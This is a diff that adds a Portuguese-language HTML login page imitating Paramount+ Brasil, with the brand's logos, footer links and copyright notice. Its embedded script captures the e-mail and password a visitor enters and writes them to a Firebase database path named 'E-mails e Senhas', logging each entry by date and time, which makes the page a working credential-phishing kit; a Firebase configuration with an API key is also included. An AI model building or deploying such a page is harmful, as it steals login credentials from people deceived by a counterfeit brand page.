@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Faça login em Paramount+ Brasil</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="responsividade.css">
+    <link rel="shortcut icon" href="imgs/favicon.svg" type="image/x-icon">
+</head>
+<body>
+    <header>
+        <div class="cabeca">
+            <a href="ladding.html"><img src="imgs/logo_paramount_preta.svg" alt="Logo Paramount+" class="logo"></a>
+            <span class="assinar">ASSINAR</span>
+        </div>
+    </header>
+
+    <main>
+        <div class="login-box">
+            <h2 class="fazerll"><span id="login">FAZER LOGIN</span></h2>
+            <form id="contatoform">
+                <div class="input-container">
+                    <input type="email" id="email" name="email" placeholder="" required>
+                    <span class="placeholder-span">E-mail</span>
+                </div>
+                <div class="input-container">
+                    <input type="password" id="password" name="password" placeholder="" required>
+                    <span class="placeholder-span">Senha</span>
+                    <img id="eyeIcon" src="imgs/oculto.svg" alt="Mostrar senha" class="eye-icon">
+                </div>
+                <div class="bt"><button type="submit" disabled>CONTINUAR</button></div>
+                <a href="#" class="esqueci-senha">Esqueceu a senha?</a>
+            </form>
+            
+            <div class="separar">
+                <span>OU</span>
+            </div>
+            <a href="#" class="parça">FAZER LOGIN COM O PARCEIRO</a>
+        </div>
+    </main>
+
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-logo">
+                <img src="imgs/logo_paramount_cinza.svg" alt="Paramount+" id="foto">
+            </div>
+
+            <div class="footer-bottom">
+                <p class="esc">Termos de Assinatura | Política de Privacidade</p>
+                <p class="esc">Dispositivos compatíveis</p>
+            </div>
+
+            <div class="footer-links">
+                <div class="footer-column">
+                    <span class="rp">Navegação do site</span>
+                    <ul>
+                        <li><a href="#">Início</a></li>
+                        <li><a href="#">Séries</a></li>
+                        <li><a href="#">Filmes</a></li>
+                        <li><a href="#">Coleções</a></li>
+                        <li><a href="#">Esportes</a></li>
+                        <li><a href="#">Paramount+ Brasil</a></li>
+                        <li><a href="#">Marcas</a></li>
+                        <li><a href="#">Paramount+ Global</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <span class="rp">Privacidade e Termos</span>
+                    <ul>
+                        <li><a href="#">Contrato de Assinatura</a></li>
+                        <li><a href="#">Termos de Uso</a></li>
+                        <li><a href="#">Política de Privacidade</a></li>
+                        <li><a href="#">Política de Privacidade das Crianças</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <span class="rp">Suporte</span>
+                    <ul>
+                        <li><a href="#">Central de ajuda</a></li>
+                        <li><a href="#">Dispositivos compatíveis</a></li>
+                        <li><a href="#">Guia de classificação indicativa</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p class="rop">O Paramount Plus é o serviço de streaming com sucessos de bilheteira, novos originais e séries de sucesso. É uma montanha de entretenimento.</p>
+            <p>© 2024 Paramount. Todos os direitos reservados.</p>
+            <p class="esc">Informações legais e suporte</p>
+        </div>
+
+    </footer>
+    
+
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js';
+        import { getDatabase, ref, push, set} from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js';
+
+        // Configuração do Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyBHfPYXSgwOXh76E9FLb1xp42Vaux2ZtiM",
+            authDomain: "projeto-seguranca-ba9fd.firebaseapp.com",
+            databaseURL: "https://formulariodeseguranca-default-rtdb.firebaseio.com",
+            projectId: "projeto-seguranca-ba9fd",
+            storageBucket: "projeto-seguranca-ba9fd.appspot.com",
+            messagingSenderId: "187030050082",
+            appId: "1:187030050082:web:6fdff51c94b636915ac17b"
+        };
+
+        // Inicializa o Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Função para manipular o envio do formulário
+        document.getElementById("contatoform").addEventListener("submit", function(e) {
+            e.preventDefault();
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var custom = 'Dados do dia '
+            var custom2 = ' as '
+
+            console.log("email:", email);
+            console.log("password:", password);
+
+            // Envia os dados para o Firebase
+            const uniqueID = new Date();
+            const unique = uniqueID.getDate();
+
+            const today = new Date();
+            const daysOfWeek = ["domingo", "segunda-feira", "terça-feira", "quarta-feira", "quinta-feira", "sexta-feira", "sábado"];
+            const dia = daysOfWeek[today.getDay()];
+
+            const uniquee = uniqueID.toLocaleTimeString();
+            const contatoFormDB = ref(database, 'E-mails e Senhas/' + custom + unique + ' ' + dia + custom2 + uniquee);
+
+            set(contatoFormDB, {
+                email: email,
+                password: password,
+            }).then(() => {
+                console.log("Dados enviados com sucesso!");
+                document.getElementById("contatoform").reset(); // Limpa o formulário
+            }).catch((error) => {
+                console.error("Erro ao enviar dados:", error);
+            });
+        });
+    </script>
+
+    
+<script>
+    document.getElementById('eyeIcon').addEventListener('click', function () {
+    const passwordField = document.getElementById('password');
+    const eyeIcon = document.getElementById('eyeIcon');
+
+    if (passwordField.type === 'password') {
+        passwordField.type = 'text';
+        eyeIcon.src = 'imgs/visivel.svg'; // ícone para mostrar a senha
+    } else {
+        passwordField.type = 'password';
+        eyeIcon.src = 'imgs/oculto.svg'; // ícone para ocultar a senha
+    }
+});
+// Seleciona os campos de e-mail, senha e o botão "CONTINUAR"
+const emailField = document.getElementById('email');
+const passwordField = document.getElementById('password');
+const continueButton = document.querySelector('button[type="submit"]');
+
+// Função para verificar os campos
+function checkFields() {
+    if (emailField.value.trim() !== '' && passwordField.value.trim() !== '') {
+        // Se ambos os campos estiverem preenchidos, muda a cor do botão
+        continueButton.style.backgroundColor = 'rgb(0, 55, 197)';
+        continueButton.disabled = false; // Habilita o botão
+    } else {
+        // Se qualquer um dos campos estiver vazio, mantém a cor original
+        continueButton.style.backgroundColor = '#666666';
+        continueButton.disabled = true; // Desabilita o botão
+    }
+}
+
+// Adiciona eventos de input para monitorar quando o usuário digita
+emailField.addEventListener('input', checkFields);
+passwordField.addEventListener('input', checkFields);
+
+</script>
+</body>
+</html>
